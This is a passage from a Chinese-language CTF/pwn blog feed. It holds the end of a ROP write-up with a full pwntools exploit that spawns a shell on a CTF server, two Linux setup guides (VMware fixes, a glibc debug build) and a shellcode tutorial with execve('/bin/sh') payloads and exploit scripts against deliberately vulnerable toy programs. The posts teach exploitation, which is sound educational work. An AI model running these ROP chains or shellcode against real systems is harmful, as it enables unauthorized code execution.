r12.text:000000000040055B                 lea     r12, __frame_dummy_init_array_entry.text:0000000000400562                 push    rbp.text:0000000000400563                 lea     rbp, __do_global_dtors_aux_fini_array_entry.text:000000000040056A                 push    rbx.text:000000000040056B                 mov     r14, rsi.text:000000000040056E                 mov     r13, rdx.text:0000000000400571                 sub     rbp, r12.text:0000000000400574                 sub     rsp, 8.text:0000000000400578                 sar     rbp, 3.text:000000000040057C                 call    _init_proc.text:0000000000400581                 test    rbp, rbp.text:0000000000400584                 jz      short loc_4005A6.text:0000000000400586                 xor     ebx, ebx.text:0000000000400588                 nop     dword ptr [rax+rax+00000000h].text:0000000000400590.text:0000000000400590 loc_400590:                             ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400590                 mov     rdx, r13.text:0000000000400593                 mov     rsi, r14.text:0000000000400596                 mov     edi, r15d.text:0000000000400599                 call    qword ptr [r12+rbx*8].text:000000000040059D                 add     rbx, 1.text:00000000004005A1                 cmp     rbx, rbp.text:00000000004005A4                 jnz     short loc_400590.text:00000000004005A6.text:00000000004005A6 loc_4005A6:                             ; CODE XREF: __libc_csu_init+34↑j.text:00000000004005A6                 add     rsp, 8.text:00000000004005AA                 pop     rbx.text:00000000004005AB                 pop     rbp.text:00000000004005AC                 pop     r12.text:00000000004005AE                 pop     r13.text:00000000004005B0                 pop     r14.text:00000000004005B2                 pop     r15.text:00000000004005B4                 retn.text:00000000004005B4 ; } // starts at 400550.text:00000000004005B4 __libc_csu_init endp</code></pre><p>实际上 <code>__libc_csu_init()</code> 没有做任何事情，无论我们调用多少次都是一样的。我们先通过第四个 rop 把它写到 buf2 上，后面再解释需要做什么：</p><pre><code class="python">rop4 = [ # buf2    libc_csu_init,    pop_rbp_ret, buf3 - 8, leave_ret]</code></pre><p>第五个 rop 往 buf2-24 和 buf2+32 的地方写东西，之后再跳上去。因为之前 gets 的地址已经被 pop 到了 r13 上，然后走一次 <code>__libc_csu_init()</code> 会 push 到栈上，这个时候也就是 buf2，之后接上一个 <code>pop rbx</code> 就能给 rbx。然后为了得到 system 的地址，我们需要用 <code>add_ebx_esi_ret</code> 把两者加起来。加完之后再把 ebx 放回栈上，也就是 buf2：</p><pre><code class="python">rop5 = [ # buf3    pop_rdi_ret, buf2 - 24, gets_plt, # rop6_1    pop_rdi_ret, buf2 + 32, gets_plt, # rop6_2    pop_rbp_ret, buf2 - 24 - 8, leave_ret]rop6_1 = [ # buf2 - 24    pop_rbx_rbp_r12_r13_r14_r15_ret]rop6_2 = [ # buf2 + 32    pop_rsi_r15_ret, offset, 8,    add_ebx_esi_ret,    libc_csu_init,    pop_rbp_ret, buf4 - 8, leave_ret]</code></pre><p>加完之后发现只留了地址的低四位，高四位被弄丢了。我们需要做的就是把所有的 offset 加上 4，这样同样的做法我们就能拿到高四位的值。因为栈其实是不需要对齐的，所以这样做是可以的。这样的话之后的操作大部分细节和之前是一样的，后面就不用加 offset 了。然后需要计算一下之前的低四位在栈上的什么地方，计算好位置之后读上去：</p><pre><code class="python">rop7 = [ # buf4    pop_rdi_ret, gets_got + 28, gets_plt, # rop8    pop_rbp_ret, buf5 - 8,    pop_rsp_r13_r14_r15_ret, gets_got + 4]rop8 = [ # gets_got + 28    leave_ret]rop9 = [ # buf5    libc_csu_init,    pop_rbp_ret, buf6 - 8, leave_ret]rop10 = [ # buf6    pop_rdi_ret, buf5 - 24, gets_plt, # rop11_1    pop_rdi_ret, buf5 + 32, gets_plt, # rop11_2    pop_rbp_ret, buf5 - 24 - 8, leave_ret]rop11_1 = [ # buf5 - 24    pop_rbx_rbp_r12_r13_r14_r15_ret]rop11_2 = [ # buf5 + 32    pop_rdi_ret, buf2 + 68, gets_plt, # rop12    pop_rbp_ret, buf2 + 68 - 8, leave_ret]rop12 = [ # buf2 + 164    libc_csu_init,    pop_rbp_ret, buf7 - 8, leave_ret]</code></pre><p>最后 system 的地址已经在栈上了，读一下参数，利用<code>__libc_csu_init()</code>调用一下就行了：</p><pre><code class="python">rop13 = [    pop_rdi_ret, buf8, gets_plt, # shell command    pop_rdi_ret, buf8,    pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2 + 24, 0, 0, 0,    call_at_r12]</code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *# context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;local = 0if local:    p = remote(&#39;127.0.0.1&#39;, 4000)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)else:    p = remote(&#39;10.21.13.69&#39;, 10010)    libc = ELF(&#39;libc.so.6&#39;)elf = ELF(&#39;./gets&#39;)g = lambda x: next(elf.search(asm(x)))system_offset = libc.symbols[&#39;system&#39;]gets_offset = libc.symbols[&#39;gets&#39;]offset = system_offset - gets_offsetif offset &lt; 0:    offset &amp;= 0xffffffffgets_plt = elf.plt[&#39;gets&#39;]gets_got = elf.got[&#39;gets&#39;]libc_csu_init = elf.symbols[&#39;__libc_csu_init&#39;]pop_rsp_r13_r14_r15_ret = g(&#39;pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret&#39;)pop_rbp_ret = g(&#39;pop rbp ; ret&#39;)pop_rdi_ret = g(&#39;pop rdi ; ret&#39;)pop_r15_ret = g(&#39;pop r15 ; ret&#39;)pop_rsi_r15_ret = g(&#39;pop rsi ; pop r15 ; ret&#39;)pop_rbp_r14_r15_ret = g(&#39;pop rbp ; pop r14 ; pop r15 ; ret&#39;)pop_rbx_rbp_r12_r13_r14_r15_ret = g(&#39;pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&#39;)add_ebx_esi_ret = g(&#39;add ebx, esi ; ret&#39;)leave_ret = g(&#39;leave ; ret&#39;)call_at_r12 = g(&#39;call QWORD PTR [r12+rbx*8]&#39;)# gdb.attach(p)bss = 0x602000buf1 = bss - 0x100buf2 = bss - 0x200buf3 = bss - 0x300buf4 = bss - 0x400buf5 = bss - 0x500buf6 = bss - 0x600buf7 = bss - 0x700buf8 = bss - 0x800rop1 = [    pop_rdi_ret, buf1, gets_plt, # rop2    pop_rdi_ret, buf2, gets_plt, # rop4    pop_rdi_ret, buf3, gets_plt, # rop5    pop_rdi_ret, buf4, gets_plt, # rop7    pop_rdi_ret, buf5, gets_plt, # rop9    pop_rdi_ret, buf6, gets_plt, # rop10    pop_rdi_ret, buf7, gets_plt, # rop13    pop_rbp_ret, buf1 - 8, leave_ret]rop2 = [ # buf1    pop_rdi_ret, gets_got + 24, gets_plt, # rop3    pop_rbp_ret, buf2 - 8,    pop_rsp_r13_r14_r15_ret, gets_got]rop3 = [ # gets_got + 24    leave_ret]rop4 = [ # buf2    libc_csu_init,    pop_rbp_ret, buf3 - 8, leave_ret]rop5 = [ # buf3    pop_rdi_ret, buf2 - 24, gets_plt, # rop6_1    pop_rdi_ret, buf2 + 32, gets_plt, # rop6_2    pop_rbp_ret, buf2 - 24 - 8, leave_ret]rop6_1 = [ # buf2 - 24    pop_rbx_rbp_r12_r13_r14_r15_ret]rop6_2 = [ # buf2 + 32    pop_rsi_r15_ret, offset, 8,    add_ebx_esi_ret,#    0xdeadbeef,    libc_csu_init,    pop_rbp_ret, buf4 - 8, leave_ret]rop7 = [ # buf4    pop_rdi_ret, gets_got + 28, gets_plt, # rop8    pop_rbp_ret, buf5 - 8,    pop_rsp_r13_r14_r15_ret, gets_got + 4]rop8 = [ # gets_got + 28    leave_ret]rop9 = [ # buf5    libc_csu_init,    pop_rbp_ret, buf6 - 8, leave_ret]rop10 = [ # buf6    pop_rdi_ret, buf5 - 24, gets_plt, # rop11_1    pop_rdi_ret, buf5 + 32, gets_plt, # rop11_2    pop_rbp_ret, buf5 - 24 - 8, leave_ret]rop11_1 = [ # buf5 - 24    pop_rbx_rbp_r12_r13_r14_r15_ret]rop11_2 = [ # buf5 + 32    pop_rdi_ret, buf2 + 68, gets_plt, # rop12    pop_rbp_ret, buf2 + 68 - 8, leave_ret]rop12 = [ # buf2 + 164    libc_csu_init,    pop_rbp_ret, buf7 - 8, leave_ret]rop13 = [    pop_rdi_ret, buf8, gets_plt, # shell command    pop_rdi_ret, buf8,    pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2 + 24, 0, 0, 0,    call_at_r12]payload = (    &#39;A&#39; * 24 +    &#39;&#39;.join(map(p64, rop1)) + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop2)) + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop4)) + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop5)) + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop7)) + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop9)) + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop10)) + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop13)) + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop3))[:-1] + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop6_1))[:-1] + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop6_2)) + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop8)) + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop11_1))[:-1] + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop11_2)) + &#39;\n&#39; +    &#39;&#39;.join(map(p64, rop12)) + &#39;\n&#39; +    &#39;sh\n&#39;)p.send(payload)p.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决VMware下Ubuntu的一些问题</title>
    <link href="/2019/03/06/%E8%A7%A3%E5%86%B3VMware%E4%B8%8BUbuntu%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
    <url>/2019/03/06/%E8%A7%A3%E5%86%B3VMware%E4%B8%8BUbuntu%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>记录一些在虚拟机上的问题。</p><a id="more"></a><h1 id="0x0-更新出错（Sub-process-returned-an-error-code）"><a href="#0x0-更新出错（Sub-process-returned-an-error-code）" class="headerlink" title="0x0 更新出错（Sub-process returned an error code）"></a>0x0 更新出错（Sub-process returned an error code）</h1><p>装了个优麒麟（Ubuntu Kylin），更新的时候居然报错了。</p><p>在 <code>sudo apt-get update</code> 后出现：</p><pre><code class="shell">Aborted (core dumped)Reading package lists... DoneE: Problem executing scripts APT::Update::Post-Invoke-Success &#39;if /usr/bin/test -w /var/cache/app-info -a -e /usr/bin/appstreamcli; then appstreamcli refresh &gt; /dev/null; fi&#39;E: Sub-process returned an error code</code></pre><p>大概跟一个安装包 <code>libappstream3</code> 有关，remove 掉就行了：</p><pre><code class="shell">sudo apt-get remove libappstream3</code></pre><h1 id="0x1-无法显示图形化界面"><a href="#0x1-无法显示图形化界面" class="headerlink" title="0x1 无法显示图形化界面"></a>0x1 无法显示图形化界面</h1><pre><code>**The system is running in low-graphics mode**Your screen, graphics cards, and input device settings could not be detected correctly. You will need to configure these yourself.</code></pre><p>装一下 vm 桌面，再更新一下磁盘：</p><pre><code class="shell">sudo apt-get updatesudo apt-get install open-vm-toolssudo apt-get install open-vm-tools-desktopsudo rebootsudo apt-get dist-upgrade</code></pre><h1 id="0x2-无法开机"><a href="#0x2-无法开机" class="headerlink" title="0x2 无法开机"></a>0x2 无法开机</h1><pre><code>intel_rapl: no valid rapl domains found in package 0</code></pre><p>在 vmware 的 <code>.vmx</code> 文件中添加 <code>paevm = &quot;TRUE&quot;</code>。如果还不能解决，说明电脑的 cpu 不支持 PAE。直接在文件 <code>/etc/modprobe.d/blacklist.conf</code> 中添加 <code>blacklist intel_rapl</code> 后重启。</p><h1 id="0x3-开机显示异常"><a href="#0x3-开机显示异常" class="headerlink" title="0x3 开机显示异常"></a>0x3 开机显示异常</h1><pre><code>piix4_smbus ****host smbus controller not enabled</code></pre><p>在文件 <code>/etc/modprobe.d/blacklist.conf</code> 中添加 <code>blacklist piix4_smbus</code> 后重启。</p><h1 id="0x4-开启后跳出提示框（Could-not-apply-the-stored-configuration-for-monitors）"><a href="#0x4-开启后跳出提示框（Could-not-apply-the-stored-configuration-for-monitors）" class="headerlink" title="0x4 开启后跳出提示框（Could not apply the stored configuration for monitors）"></a>0x4 开启后跳出提示框（Could not apply the stored configuration for monitors）</h1><p>这个弹出窗口的意思是，不能应用当前显示器的设置，也就是显示器的设置有错误。在关机的时候，系统会保存上一次的设置，在 <code>$HOME/.config</code> 下生成一个 <code>monitors.xml</code> 的文件。只需要把这个文件删除即可：</p><pre><code>sudo rm -rf ~/.config/monitors.xml</code></pre><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://blog.csdn.net/xiaxuesong666/article/details/77072770" target="_blank" rel="noopener">https://blog.csdn.net/xiaxuesong666/article/details/77072770</a><br><a href="https://askubuntu.com/questions/998318/the-system-is-running-in-low-graphics-mode-error-after-installing-vmware-tools" target="_blank" rel="noopener">https://askubuntu.com/questions/998318/the-system-is-running-in-low-graphics-mode-error-after-installing-vmware-tools</a><br><a href="http://www.it610.com/article/3346432.htm" target="_blank" rel="noopener">http://www.it610.com/article/3346432.htm</a><br><a href="https://blog.csdn.net/think_embed/article/details/8805510" target="_blank" rel="noopener">https://blog.csdn.net/think_embed/article/details/8805510</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>solution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu16.04下编译libc2.23</title>
    <link href="/2019/03/04/Ubuntu16-04%E4%B8%8B%E7%BC%96%E8%AF%91libc2-23/"/>
    <url>/2019/03/04/Ubuntu16-04%E4%B8%8B%E7%BC%96%E8%AF%91libc2-23/</url>
    
    <content type="html"><![CDATA[<p>为了更好地调试堆，需要自己编译一个带 Symbol 的 libc。</p><a id="more"></a><h1 id="环境和工具"><a href="#环境和工具" class="headerlink" title="环境和工具"></a>环境和工具</h1><ul><li>Ubuntu16.04</li><li>glibc-2.23.tar.gz</li></ul><pre><code class="bash">assassinq@ubuntu ~/glibc-2.23/build$ uname -aLinux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</code></pre><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>从 ftp 上把 glibc 下载下来，解压后新建一个 build 文件夹：</p><pre><code class="bash">cd &amp;&amp; wget http://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz \tar -xvf glibc-2.23.tar.gz &amp;&amp; cd glibc-2.23 \mkdir build &amp;&amp; cd build # mkdir build32 &amp;&amp; cd build32</code></pre><h1 id="编译过程中的挖坑和填坑"><a href="#编译过程中的挖坑和填坑" class="headerlink" title="编译过程中的挖坑和填坑"></a>编译过程中的挖坑和填坑</h1><p>在 build 文件夹下 configure，并且加上一些必要的参数使得编译时加上 symbol，并且指定输出文件夹：（转自 <a href="https://www.youtube.com/watch?v=wsIvqd9YqTI&amp;feature=share" target="_blank" rel="noopener">2016 年 winesap 的社课</a>）</p><pre><code class="bash"># x64CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot; \CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot; \../configure --prefix=/path/to/install# x32CC=&quot;gcc -m32&quot; CXX=&quot;g++ -m32&quot; \CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot; \CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot; \../configure --prefix=/path/to/install --host=i686-linux-gnu</code></pre><p>如果没有任何意外的话就能直接 <code>make &amp;&amp; make install</code> 编译了。下面记录一下遇到的几个坑。（感谢 <a href="https://n132.github.io/2018/04/30/2018-04-30-%E7%BC%96%E8%AF%91-Libc-2-23/" target="_blank" rel="noopener">n132 大哥的博客</a>）</p><h2 id="某些安装包缺失"><a href="#某些安装包缺失" class="headerlink" title="某些安装包缺失"></a>某些安装包缺失</h2><p>configure 的时候提示有些安装包缺失，不能生成 Makefile：</p><pre><code>configure: error:*** These critical programs are missing or too old: gawk*** Check the INSTALL file for required versions.</code></pre><p>根据提示安装一下即可：</p><pre><code class="bash">sudo apt update &amp;&amp; sudo apt install gawk</code></pre><h2 id="warnings-being-treated-as-errors"><a href="#warnings-being-treated-as-errors" class="headerlink" title="warnings being treated as errors"></a><code>warnings being treated as errors</code></h2><pre><code>In file included from regex.c:67:0:regexec.c: In function ‘check_node_accept_bytes’:regexec.c:3856:29: error: ‘extra’ may be used uninitialized in this function [-Werror=maybe-uninitialized]        const unsigned char *coll_sym = extra + cset-&gt;coll_syms[i];                             ^cc1: all warnings being treated as errors../o-iterator.mk:9: recipe for target &#39;/home/assassinq/glibc-2.23/build/posix/regex.o&#39; failedmake[2]: *** [/home/assassinq/glibc-2.23/build/posix/regex.o] Error 1make[2]: Leaving directory &#39;/home/assassinq/glibc-2.23/posix&#39;Makefile:214: recipe for target &#39;posix/subdir_lib&#39; failedmake[1]: *** [posix/subdir_lib] Error 2make[1]: Leaving directory &#39;/home/assassinq/glibc-2.23&#39;Makefile:9: recipe for target &#39;all&#39; failedmake: *** [all] Error 2</code></pre><p><code>cc1: all warnings being treated as errors</code> 是因为设置了警告提示，这里可以回到之前 configure 的时候，<code>CFLAGS</code> 新增加一个参数 <code>-Wno-error</code> 来去除警告：</p><pre><code class="bash">CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</code></pre><blockquote><p>2020-05-02 更新：在 20.04 中编译 glibc-2.29 和 glibc-2.31 的时候发现在加 FALGS 里加 <code>-Wno-error</code> 没有用了，需要在 configure 时增加 <code>--disable-werror</code> 参数。<br>同时在 20.04 中编译 glibc-2.29 需要额外加上 <code>--enable-cet</code> 参数来避免链接报错（因为 20.04 自带的 gcc 隐式启用 <code>-fcf-protection</code> 标志）</p></blockquote><h2 id="ld-so-conf-缺失"><a href="#ld-so-conf-缺失" class="headerlink" title="ld.so.conf 缺失"></a><code>ld.so.conf</code> 缺失</h2><pre><code>/home/assassinq/glibc-2.23/build/elf/ldconfig: Warning: ignoring configuration file that cannot be opened: /home/assassinq/glibc-2.23/64/etc/ld.so.conf: No such file or directorymake[1]: Leaving directory &#39;/home/assassinq/glibc-2.23&#39;</code></pre><p>这里只需要直接 touch 一个新文件即可：</p><pre><code class="bash">cd ../64/etc &amp;&amp; sudo touch ld.so.conf</code></pre><h2 id="Build-with-Docker"><a href="#Build-with-Docker" class="headerlink" title="Build with Docker"></a>Build with Docker</h2><p>在 macOS 下使用 Docker 挂载 glibc 目录后再进行编译可能会有以下错误：</p><pre><code class="bash">/root/tmp/elf/dl-load.c:1850: undefined reference to `__GI___xstat64&#39;/usr/bin/ld: /root/tmp/build/elf/librtld.os: relocation R_X86_64_PC32 against undefined symbol `__GI___xstat64&#39; can not be used when making a shared object; recompile with -fPIC/usr/bin/ld: final link failed: Bad valuecollect2: error: ld returned 1 exit status</code></pre><p>原因是 macOS 默认文件系统呢对大小写不敏感，不过解决方法似乎只有格式化成大小写不敏感的文件系统。（<a href="https://stackoverflow.com/questions/55355885/error-trying-to-install-glibc-in-wsl-relocation-r-x86-64-pc32-against-undefined）" target="_blank" rel="noopener">https://stackoverflow.com/questions/55355885/error-trying-to-install-glibc-in-wsl-relocation-r-x86-64-pc32-against-undefined）</a></p><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>通过设置 <code>LD_LIBRARY_PATH</code> 把程序的动态链接库更改为添加了调试符号的版本：</p><pre><code class="bash">$ export LD_LIBRABRY_PATH=/path/to/install/lib</code></pre><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://n132.github.io/2018/04/30/2018-04-30-%E7%BC%96%E8%AF%91-Libc-2-23/" target="_blank" rel="noopener">https://n132.github.io/2018/04/30/2018-04-30-%E7%BC%96%E8%AF%91-Libc-2-23/</a><br><a href="https://www.youtube.com/watch?v=wsIvqd9YqTI&amp;feature=share" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wsIvqd9YqTI&amp;feature=share</a><br><a href="https://stackoverflow.com/questions/8132594/disable-werror-ini-configure-file" target="_blank" rel="noopener">https://stackoverflow.com/questions/8132594/disable-werror-ini-configure-file</a><br><a href="https://www.stacknoob.com/s/bsxmrGZgZTpjwfpnpmAgNT" target="_blank" rel="noopener">https://www.stacknoob.com/s/bsxmrGZgZTpjwfpnpmAgNT</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellcode Tricks</title>
    <link href="/2019/03/02/Shellcode-Tricks/"/>
    <url>/2019/03/02/Shellcode-Tricks/</url>
    
    <content type="html"><![CDATA[<p>The Splendid Shellcode.</p><a id="more"></a><p>Shellcode 是一串可以直接被执行的机器码，可以用来获得 Shell。NX（DEP）（No eXecute）即可写不可执行、可执行不可写。</p><ul><li>可以控制程序执行流，可以控制一定的 data；</li><li>利用 <code>mprotect()</code> 或者 <code>_dl_make_stack_executable()</code> 改写某些区域的 porc 再执行。</li></ul><p>关于 System Call：</p><pre><code class="cpp">sys_execve( const char *filename, char *const argv[], char *const envp[] );</code></pre><p>目标：</p><pre><code class="cpp">execve(&quot;/bin/sh&quot;, 0, 0);</code></pre><p>System Call x86：</p><table><thead><tr><th style="text-align:center">eax</th><th style="text-align:center">ebx</th><th style="text-align:center">ecx</th><th style="text-align:center">edx</th><th style="text-align:center">else</th></tr></thead><tbody><tr><td style="text-align:center">0xb</td><td style="text-align:center">addr of “/bin/sh”</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">int 0x80</td></tr></tbody></table><p>System Call x64：</p><table><thead><tr><th style="text-align:center">rax</th><th style="text-align:center">rdi</th><th style="text-align:center">rsi</th><th style="text-align:center">rdx</th><th style="text-align:center">else</th></tr></thead><tbody><tr><td style="text-align:center">59</td><td style="text-align:center">addr of “/bin/sh”</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">syscall</td></tr></tbody></table><h1 id="Basic-Shellcode"><a href="#Basic-Shellcode" class="headerlink" title="Basic Shellcode"></a>Basic Shellcode</h1><p>最基础的 shellcode，对输入的长度没有做严格限制。</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>Source Code：</p><pre><code class="c">// gcc main.c -m32 -z execstack -o main#include &lt;stdio.h&gt;int main() {    void (*ptr)();    char buf[0x20];    puts(&quot;shellcode&gt;&gt;&quot;);    read(0, buf, 0x20);    ptr = buf;    ptr();}</code></pre><p>push 字符串<code>&quot;/bin/sh&quot;</code>，此时 esp 指向字符串，即直接把 esp 的值赋给 ebx 即可。<code>&quot;/bin/sh&quot;</code>的值可以在 gdb 调试中<code>searchmem /bin/sh</code>得到。Shellcode 的长度为 29。</p><p>Exploit：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *p = process(&#39;./main&#39;)context.arch = &#39;i386&#39;sh = asm(&#39;&#39;&#39;    mov eax, 0xb    mov ecx, 0    mov edx, 0    push 0x68732f    push 0x6e69622f    mov ebx, esp    int 0x80&#39;&#39;&#39;)info(disasm(sh))info(len(sh))# gdb.attach(p)p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x20))p.interactive()</code></pre><h2 id="shellcode64"><a href="#shellcode64" class="headerlink" title="shellcode64"></a>shellcode64</h2><p>Source Code：</p><pre><code class="c">// gcc main.c -z execstack -o main#include &lt;stdio.h&gt;int main() {    void (*ptr)();    char buf[0x40];    puts(&quot;shellcode&gt;&gt;&quot;);    read(0, buf, 0x40);    ptr = buf;    ptr();}</code></pre><p>64 位下不能直接 push 值，需要通过寄存器 push。Shellcode 的长度为 37</p><p>Exploit：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *p = process(&#39;./main&#39;)context.arch = &#39;amd64&#39;sh = asm(&#39;&#39;&#39;    mov rax, 59    mov rsi, 0    mov rdx, 0    mov rdi, 0x68732f6e69622f    push rdi    mov rdi, rsp    syscall&#39;&#39;&#39;)info(disasm(sh))info(len(sh))# gdb.attach(p)p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x40))p.interactive()</code></pre><h1 id="Baby-Shellcode"><a href="#Baby-Shellcode" class="headerlink" title="Baby Shellcode"></a>Baby Shellcode</h1><p>对接受的字符串长度做了一点限制，需要通过一些 Tricks 来缩短 Shellcode 的长度。</p><h2 id="shellcode-20"><a href="#shellcode-20" class="headerlink" title="shellcode_20"></a>shellcode_20</h2><p>Source Code：</p><pre><code class="c">// gcc main.c -m32 -z execstack -o main#include &lt;stdio.h&gt;int main() {    void (*ptr)();    char buf[0x20];    puts(&quot;shellcode&gt;&gt;&quot;);    read(0, buf, 20);    ptr = buf;    ptr();}</code></pre><p>32 位下，<code>mov ecx, 0</code> 是 5 个字节，而 <code>xor ecx, ecx</code> 只有 2 个字节，两者同样是给寄存器清零，后者可以省去 3 个字节。<code>mov eax, 0xb</code> 同样需要 5 个字节，而在 eax 为 0 的情况下，我们只需要 <code>mov al, 0xb</code>，只需要 2 个字节。<code>mul ebx</code> 需要 2 个字节，其作用是将 eax 中值与 ebx 相乘，所得结果高位存在 edx，低位存在 eax。在调试中我们发现 ebx 的值为零，此时使用乘法指令可以直接使 eax 和 edx 的值变为 0，可以直接对 al 赋值，同时不用再对 edx 清零。最终 Shellcode 的长度缩短为 20 字节。执行 shellcode 时寄存器的状态：</p><pre><code>─────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────── EAX  0xffffd6ec —▸ 0xf7e20a50 ◂— jb     0xf7e20a54 /* &#39;fer&#39; */ EBX  0x0 ECX  0xffffd6ec —▸ 0xf7e20a50 ◂— jb     0xf7e20a54 /* &#39;fer&#39; */ EDX  0x14 EDI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */ ESI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */ EBP  0xffffd718 ◂— 0x0 ESP  0xffffd6dc —▸ 0x80484d5 (main+74) ◂— mov    eax, 0 EIP  0xffffd6ec —▸ 0xf7e20a50 ◂— jb     0xf7e20a54 /* &#39;fer&#39; */───────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────── ► 0xffffd6ec    push   eax   0xffffd6ed    or     ah, dl   0xffffd6ef    test   dword ptr [ecx], 0   0xffffd6f5    add    byte ptr [eax], al   0xffffd6f7    add    byte ptr [eax + 0x1a], dl    ↓   0xffffd6f7    add    byte ptr [eax + 0x1a], dl</code></pre><p>Exploit：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *p = process(&#39;./main&#39;)context.arch = &#39;i386&#39;sh = asm(&#39;&#39;&#39;    mul ebx    mov al, 0xb    xor ecx, ecx    push 0x0068732f    push 0x6e69622f    mov ebx, esp    int 0x80&#39;&#39;&#39;)info(disasm(sh))info(len(sh))gdb.attach(p)p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x20, &#39;\x00&#39;))p.interactive()</code></pre><p>还有一种就是构造 <code>read</code>，读入 shellcode，可以直接缩短到 8 个字节：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *p = process(&#39;./main&#39;)context.arch = &#39;i386&#39;sh = asm(&#39;&#39;&#39;    mul ebx    mov al, 0x3    mov dl, 0x90    int 0x80&#39;&#39;&#39;)info(disasm(sh))info(len(sh))gdb.attach(p)p.sendlineafter(&#39;shellcode&gt;&gt;\n&#39;, sh)payload = &#39;\x90&#39; * 0x20 + asm(shellcraft.sh())p.sendline(payload)p.interactive()</code></pre><h2 id="shellcode64-22"><a href="#shellcode64-22" class="headerlink" title="shellcode64_22"></a>shellcode64_22</h2><p>Source Code：</p><pre><code class="c">// gcc main.c -z execstack -o main#include &lt;stdio.h&gt;int main() {    void (*ptr)();    char buf[0x40];    puts(&quot;shellcode&gt;&gt;&quot;);    read(0, buf, 22);    ptr = buf;    ptr();}</code></pre><p>调试中可以发现 rax 和 rbx 的值为 0，我们可以把 7 个字节的 <code>mov rax, 59</code> 缩短为 2 个字节的 <code>mov al, 59</code>。同时清零 rdx 和 rsi 的工作可以通过 xor 来缩短成 3 个字节。然而，通过观察发现，64 位下只能通过寄存器的 push 只需要 1 个字节。如果用 push 和 pop，即 <code>push rbx ; pop rsi</code> 只需要 2 个字节。后面对 rdi 的赋值也可以通过同样的方式达到目的。最终 Shellcode 的长度缩短为 21 字节。执行 shellcode 时寄存器的状态：</p><pre><code>─────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────── RAX  0x0 RBX  0x0 RCX  0x7ffff7b04260 (__read_nocancel+7) ◂— cmp    rax, -0xfff RDX  0x7fffffffe590 ◂— 0xa50 /* &#39;P\n&#39; */ RDI  0x0 RSI  0x7fffffffe590 ◂— 0xa50 /* &#39;P\n&#39; */ R8   0x602000 ◂— 0x0 R9   0xd R10  0x37b R11  0x246 R12  0x4004e0 (_start) ◂— xor    ebp, ebp R13  0x7fffffffe6c0 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffe5e0 —▸ 0x400640 (__libc_csu_init) ◂— push   r15 RSP  0x7fffffffe578 —▸ 0x400625 (main+79) ◂— mov    eax, 0 RIP  0x7fffffffe590 ◂— 0xa50 /* &#39;P\n&#39; 